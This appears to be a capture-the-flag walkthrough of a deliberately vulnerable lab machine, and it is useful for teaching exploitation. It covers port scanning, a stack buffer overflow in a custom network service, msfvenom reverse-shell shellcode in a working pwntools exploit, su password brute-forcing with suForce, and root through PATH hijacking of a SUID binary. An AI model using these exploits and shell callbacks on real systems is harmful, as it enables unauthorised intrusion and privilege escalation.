![Screenshot](/hard/Insecure/Images/machine.png)

Difficulty: **hard**

Made by: **4bytes**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

## 🛠️  Techniques: Analyse a compiled binary, exploit a BoF, brute force, reverse engineering with ltrace, path hijacking

---

First of all we make sure the machine is up, we can check with the command **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.248 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.166 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.110 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2028ms
rtt min/avg/max/mdev = 0.110/0.174/0.248/0.056 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

We always start with **nmap** to know what ports are open in the target machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 11:49 -0500
Initiating ARP Ping Scan at 11:49
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:49, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:49
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 20201/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:49, 3.20s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000026s latency).
Scanned at 2026-01-07 11:49:02 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
20201/tcp open  unknown syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see that are 2 ports open:

- port 80 (http / Hyper-Text Transfer Protocol)
- port 20201 (???)

To know more about these ports let's do another scan with **nmap** to know what services and versions are running in these ports.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ nmap -p80,20201 -sCV 172.17.0.2 -oX target
```

**-p22,20201** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/Insecure/Images/image1.png)

As we can see is more pretty and readable to the sight.

It seems the port 80 is a website, so let's use **whatweb** to know more what **technologies** uses this website.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[software installation]
```

We can see that it uses **Apache** but nothing else, so let's take a look with the browser.

![Screenshot](/hard/Insecure/Images/image2.png)

Only we can see this, even a little bit of enumeration we don't find anything interesting.

So let's download this thing.

we can see that is a binary file of 32 bits.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ file secure_software 
secure_software: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1badf7bdd2ab6ae00b8c3b1f965fca6048d32478, for GNU/Linux 3.2.0, not stripped
```

And is a **executable** but before doing things with this let's connect to the machine in the port **20201** with **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc 172.17.0.2 20201
Enter data: hello?
Data received correctly
```

It seems that only receive data.

So let's execute our executable in our own machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ ./secure_software 
Listening at 0.0.0.0:20201!
```

It seems that listen in the same port.

So let's connect once again but in our **localhost**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc localhost 20201
Enter data: yes123
Data received correctly
```

We can see that is the same executable that uses the target machine in the port 20201.

Okay, let's connect once again and enter a lot of data and see what happens.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc localhost 20201
Enter data: AAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

And we can see a segmentation fault in the server.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ ./secure_software 
Listening at 0.0.0.0:20201!
Listening at 0.0.0.0:20201!
zsh: segmentation fault  ./secure_software
```

It seems that is vulnerable to a **BoF** (Buffer Overflow)

So let's use **GDB** (GNU Debugger) to analyse it better what happens when we enter so much data.

---
# Exploitation

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ gdb -q secure_software 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from secure_software...
(No debugging symbols found in secure_software)
gef➤
```

So let's run the binary with just simply enter **r**

```r
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/insecure/files/secure_software 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Listening at 0.0.0.0:20201!
```

Now let's connect once again and enter a lot of data.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc localhost 20201
Enter data: AAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

And we can see this in our **gdb**:

![Screenshot](/hard/Insecure/Images/image3.png)

We can see a lot of information here, but let's just only see the first data that is the registers, that's being indicated with the colour **red**

We can see that when we enter so much data in the buffer (buffer is like a space available of data) that we overwrite more registers like **EBP** and **EIP**

This is dangerous because we can change the flow of the program that we want to.

If you don't know what a **EIP** (Extended Instruction Pointer) is basically telling to the program what instruction needs to be executed after, is like a guide for the program.

And as we can see in the image **EIP** his value is **AAAA** (0x41414141), for the computer this address is invalid, because  doesn't exist a instruction with that address.

So if we modify the value of **EIP** we can change the flow of the program wherever we want, and lead the execution of the program to another place.

Okay so let's check what protections uses this binary with **checksec**

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/insecure/files/secure_software'
Canary : ✘
NX : ✘
PIE : ✘                    
Fortify : ✘                     
RelRO : Partial                         
gef➤
```

We can see that the permission of **NX** (Not Executable) is disabled, this means that we can execute commands to the system.

So we can enter **shellcodes** in the stack to execute commands in the system.

But we need the **offset** of the **EIP** this is like a location of the EIP before **overwritting** in it.

We can use **patterns** to know the total number of bytes before writing eip.

All of these functions that I am using is a plugin of GDB, that is **gef** you can take a look in github right [here](https://github.com/hugsy/gef)

To get a **pattern** we need just to enter the next command in gef: **pattern create**

```r
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaa...                 
[+] Saved as '$_gef0'
```

Okay so let's copy all of this to the clipboard.

Then let's run once again the program to connect once again and enter all of this.

Then let's connect once again with **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc localhost 20201
Enter data: aaaabaaacaaadaaaeaaaf...
```

And we can see this:

![Screenshot](/hard/Insecure/Images/image4.png)

Looks the same but with just different strings.

And we can get the offset of EIP with the next command:

**pattern offset $eip**

```r
gef➤  pattern offset $eip
[+] Searching for '7a616164'/'6461617a' with period=4
[+] Found at offset 300 (little-endian search) likely
```

And we found the offset of eip that is **300**, to check it we can make a string of characters of 300 bytes and add **BBBB** to see if we can overwrite the EIP with these characters

```r
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Then let's run once again the program and connect to enter this string.

![Screenshot](/hard/Insecure/Images/image5.png)

We can see that we found the offset of eip is equal to 300, and his value is BBBB, also we can see that **ESP** (Extended Stack Pointer) is being overwritten with a lot of Cs

**ESP** is another register that points at the top of the stack (the most recently pushed item), so we can try to know where is located **ESP** with **objdump** to the binary.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ objdump -d secure_software | grep jmp | grep esp
 8049213:       ff e4                   jmp    *%esp
```

We found the location of this instruction that is: **8049213** (0x8049213)

And for the **jmp esp** instruction this makes that the **CPU** **jumps** to the memory address to **ESP**, this is very important to know to execute commands correctly.

So after of doing all of this we can make a exploit, and use **pwntools**.

To generate the **shellcode** and make a reverse shell, we can use **msfvenom**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.20 LPORT=1234 -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x00"
"\x14\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

All that string is the **shellcode.**

So here it is the exploit made with python.

```python
from pwn import *

target = "172.17.0.2"
port = 20201

def send_data():
    connect = remote(target, port)

    eip_offset = 300

    # 8049213

    esp = b"\x13\x92\x04\x08"

    payload = b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
    payload += b"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x00"
    payload += b"\x14\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3"
    payload += b"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
    payload += b"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

    trash = b"A"*eip_offset + esp + payload

    connect.sendafter(b"Enter data: ", trash)

    connect.close()

if __name__ == "__main__":
    send_data()
```

The address of the esp needs to be in backwards, because the architecture of this binary is **little-endian**

So here is a example how it works the exploit with **excalidraw**

![Screenshot](/hard/Insecure/Images/image6.png)

Okay so now, let's execute the script to gain a reverse shell, but first let's be in listen mode with **netcat** to receive the shell from our attack machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Great so now let's execute the **exploit**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ python3 exploit.py 
[+] Opening connection to 172.17.0.2 on port 20201: Done
[*] Closed connection to 172.17.0.2 port 20201
```

We see this but with **netcat** we can see this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 47296
whoami
securedev
```

Great so let's modify this shell to operate more comfy.

First of all we do this:

```r
securedev@34104cab34e5:/home/securedev$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```r
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```r
securedev@34104cab34e5:/home/securedev$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```r
securedev@34104cab34e5:/home/securedev$ stty rows {num} columns {num}
```

and finally it looks way better!

---
# Privilege Escalation

In our home directory we can find this:

```d
securedev@34104cab34e5:/home/securedev$ cat hashfile 
This is for you, john the ripper:

21571b31a8d2e8b03690989835872cc6
```

We find this hash, it seems is in **MD5** we can use **john** to brute force or even with **crackstation**

But this is useless because this hash it seems **unbreakable**.

We can try to find possible files that the user **johntheripper** owns.

```r
securedev@34104cab34e5:/home/securedev$ find / -user johntheripper 2>/dev/null | grep -v proc
/opt/.hidden/words
/home/johntheripper
```

So we find something interesting on the 1st file.

```d
securedev@34104cab34e5:~$ cat /opt/.hidden/words
I love these words:

test123test333
333300trest
trest00aa20_
_23t_32_g4
testnefg321ttt
trestre2612t33s
11tv1e0st!!!!!
!!10t3bst??
tset0tevst!
ts!tse?test01
_0test!X!test0
0143_t3s5t53_0
```

It seems is a list of password, maybe of the user **johntheripper** so i'm going to use **suForce** to make a attack of brute force with this list.

I can try to make the script be in **base64** and decode it in the target machine:

```r
┌──(craft㉿kali)-[~/hacks/suForce]
└─$ cat suForce | base64 | tr -d '\n' | xclip -sel clip
```

and all the format is copied on my clipboard, now let's decode it on the target machine.

```r
securedev@34104cab34e5:~$ echo "IyEvYmluL2Jhc2gKCnJlYWRvbmx5IFJFRD0iXGVbOTFtIgpy...K" | base64 -d > suForce
```

Okay so let's use **suForce** with the list of passwords.

```r
securedev@34104cab34e5:~$ bash suForce -u johntheripper -w /opt/.hidden/words
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | johntheripper
📖 Wordlist | /opt/.hidden/words
🔎 Status   | 11/14/78%/tset0tevst!
💥 Password | tset0tevst!
───────────────────────────────────
```

The password is: **tset0tevst!**

```r
securedev@34104cab34e5:~$ su johntheripper
Password: 
johntheripper@34104cab34e5:/home/securedev$ whoami
johntheripper
```

Okay so we can find possible files with permission of **SUID** with **find**

```r
johntheripper@34104cab34e5:~$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/sbin/exim4
/home/johntheripper/show_files
```

We find a file **show_files** that is on currently home directory.

Let's execute it and see what happens.

```r
johntheripper@34104cab34e5:~$ ./show_files 
show_files
```

It seems only show files in the current directory, so let's transfer this file to our attack machine, we can use **python3** to transfer files.

```r
johntheripper@34104cab34e5:~$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ..
```

We can use **wget** to transfer the file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ wget http://172.17.0.2:100/show_files
--2026-01-07 16:09:35--  http://172.17.0.2:100/show_files
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16064 (16K) [application/octet-stream]
Saving to: ‘show_files’

show_files                                                  100%[=================================>]  15.69K  --.-KB/s    in 0s      

2026-01-07 16:09:35 (475 MB/s) - ‘show_files’ saved [16064/16064]
```

We can see the execution of the program with **ltrace** so let's do it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ ltrace ./show_files
setuid(0)                                                       = -1
setgid(0)                                                       = -1
system("ls"secure_software  show_files
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++
```

We can see that the **uid** changes to 0 (**root**) and also the **gid** (0) (**root**) and executes the command **ls**

But this is vulnerable to a **path hijacking** because the **ls** command is not defined with the full path of the binary.

So in the target machine let's make a file in the target machine with the same name as **ls**

```r
johntheripper@34104cab34e5:~$ echo -e '#!/bin/bash\nbash' > ls
```

Great so now let's give them permission of execution:

```r
johntheripper@34104cab34e5:~$ chmod +x ls
```

So then let's change the PATH of the system.

```r
johntheripper@34104cab34e5:~$ export PATH=/home/johntheripper:$PATH
```

Okay so once the command **show_files** is executed, the user **root** are going to execute the **ls** command from the actual path that the "command" ls is going to execute a bash/shell and get a shell as the user **root**.

So let's execute it then.

```r
johntheripper@152b866c1aea:~$ export PATH=/home/johntheripper:$PATH
johntheripper@152b866c1aea:~$ ./show_files 
root@152b866c1aea:~# whoami
root
```

we are root now ***...pwned..!***
